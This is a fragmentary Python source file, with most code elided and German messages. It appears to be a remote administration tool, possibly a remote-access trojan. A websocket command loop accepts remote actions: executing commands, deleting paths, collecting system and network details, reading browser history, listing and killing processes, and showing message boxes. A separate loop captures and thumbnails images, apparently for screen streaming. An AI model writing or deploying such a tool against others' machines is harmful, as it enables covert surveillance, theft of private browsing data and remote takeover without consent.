...
def get_detailed_system_info() -> str:
    ...
    try:
        ...
        try:
            ...
            info["Arbeitsspeicher (MB)"] = str(ram_mb)
        except Exception as e:
            logging.error(f"Fehler: {e}")
            info["Arbeitsspeicher (MB)"] = "Unbekannt"
        try:
            free_space = shutil.disk_usage('.').free / (1024 * 1024)
        except Exception as e:
            logging.error(f"Fehler beim Abrufen des freien Speicherplatzes: {e}")
            free_space = 0
...
def get_network_info() -> str:
    ...
    try:
        ...
        try:
            ...
            info["Aktive TCP-Verbindungen"] = str(len(connections))
        except Exception as e:
            logging.error(f"Fehler beim Abrufen der Verbindungen: {e}")
            info["Aktive TCP-Verbindungen"] = "Unbekannt"
...
def get_history() -> str:
    ...
    try:
        ...
        return f"Fehler beim Abrufen des Browserverlaufs: {e}"
...
def kill_process(pid: str) -> str:
    ...
    try:
        ...
        process.terminate()
        return f"Prozess {pid_int} ({process.name()}) wurde beendet."
    except ValueError:
            ...
            while self._running:
                try:
                    ...
                    try:
                        ...
                        logging.warning("Resampling.LANCZOS nicht verfügbar. Fallback auf BICUBIC.")
                        img.thumbnail((1280, 720), Image.BICUBIC)
                    buf = io.BytesIO()
    ...
    async for message in websocket:
        try:
            ...
            if action == "exec":
                ...
                output = change_directory(command.get("path", "."))
            elif action == "rm":
                output = remove_path(command.get("path"))
            elif action == "mkdir":
                output = make_directory(command.get("path"))
            elif action == "systeminfo":
                output = get_detailed_system_info()
            elif action == "network_info":
                output = get_network_info()
            elif action == "history":
                output = get_history()
            elif action == "ps":
                output = get_process_list()
            elif action == "kill":
                output = kill_process(command.get("pid"))
            elif action == "msgbox":
                output = show_message_box(command.get("text"))
